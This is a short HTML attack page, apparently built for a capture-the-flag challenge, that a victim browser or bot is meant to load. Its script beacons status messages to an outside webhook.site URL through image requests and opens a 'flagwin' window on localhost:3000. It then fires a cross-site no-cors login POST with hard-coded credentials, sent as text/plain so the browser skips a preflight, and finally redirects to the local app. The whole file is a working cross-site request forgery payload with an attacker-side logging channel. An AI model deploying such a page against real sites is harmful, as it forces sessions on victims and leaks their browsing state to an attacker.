<!doctype html>
<meta charset="utf-8">
<title>dbg</title>
<script>
const HOOK = 'https://webhook.site/0df0cf2d-361c-41d8-9a41-baab3da0cd73';
const LOCAL = 'http://localhost:3000';
const USER = 'aaaabbbb';
const PASS = 'aaaabbbbcc';

function log(msg) {
  new Image().src = HOOK + '?dbg=' + encodeURIComponent(msg) + '&t=' + Date.now();
}

log('page-start origin=' + location.origin);

let w = null;
try {
  w = window.open(LOCAL + '/', 'flagwin');
  log('window-open=' + (!!w));
} catch (e) {
  log('window-open-err=' + e);
}

setTimeout(async () => {
  try {
    log('before-login-fetch');
    await fetch(LOCAL + '/api/auth/login', {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'text/plain;charset=UTF-8'
      },
      body: JSON.stringify({
        username: USER,
        password: PASS
      })
    });
    log('after-login-fetch');
  } catch (e) {
    log('login-fetch-err=' + e);
  }

  setTimeout(() => {
    log('before-nav-home');
    location = LOCAL + '/';
  }, 3000);
}, 2500);
</script>
